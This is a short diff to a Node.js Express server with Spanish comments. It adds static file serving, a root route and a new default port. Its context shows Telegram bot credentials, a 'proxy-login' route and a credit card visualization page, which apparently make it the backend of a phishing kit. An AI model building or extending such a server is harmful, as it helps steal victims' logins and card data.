@@ -9,7 +9,9 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static("public"));
+
+// Servir archivos estáticos desde /public
+app.use(express.static(path.join(__dirname, "public")));
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
@@ -37,6 +39,11 @@ if (fs.existsSync(CONFIG_FILE)) {
   };
   fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
 }
+
+// Ruta raíz: index.html
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
 
 // Login
 app.post("/proxy-login", async (req, res) => {
@@ -99,7 +106,6 @@ app.get("/config", (req, res) => {
 });
 
 app.post("/config", (req, res) => {
-  // Normalizar valores recibidos desde admin
   config.producto1 = req.body.producto1 || "";
   config.monto1 = req.body.monto1 || 0;
 
@@ -141,7 +147,7 @@ app.get("/visualizacion-tarjeta", (req, res) => {
   return res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
   console.log(`Servidor corriendo en el puerto ${PORT}`);
 });
